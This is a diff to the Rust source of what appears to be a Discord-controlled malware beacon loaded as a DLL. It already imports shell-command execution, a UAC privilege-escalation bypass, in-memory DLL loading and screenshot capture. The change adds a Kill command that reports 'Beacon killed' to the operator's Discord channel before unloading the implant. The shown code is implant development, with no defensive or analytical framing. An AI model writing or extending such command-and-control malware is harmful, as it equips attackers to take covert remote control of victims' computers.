@@ -14,8 +14,8 @@ use reqwest::StatusCode;
 #[cfg(windows)]
 use crate::commands::capture_screenshot;
 use crate::commands::{
-    execute_shell_command, execute_uac_bypass, get_help_message, load_dll_from_bytes, Command,
-    CommandResult,
+    execute_kill, execute_shell_command, execute_uac_bypass, get_help_message, load_dll_from_bytes,
+    Command, CommandResult,
 };
 use crate::config::Config;
 use crate::error::{BeaconError, Result};
@@ -408,6 +408,12 @@ impl DiscordClient {
                 let result = execute_uac_bypass(&cmd);
                 self.send_command_result(channel_id, result)?;
                 Ok(true)
+            }
+            Command::Kill => {
+                // Send confirmation BEFORE killing - FreeLibraryAndExitThread never returns
+                self.send_message(channel_id, "Beacon killed")?;
+                // This function never returns - it unloads the DLL and terminates the thread
+                execute_kill();
             }
             Command::Help => {
                 let result = get_help_message("");
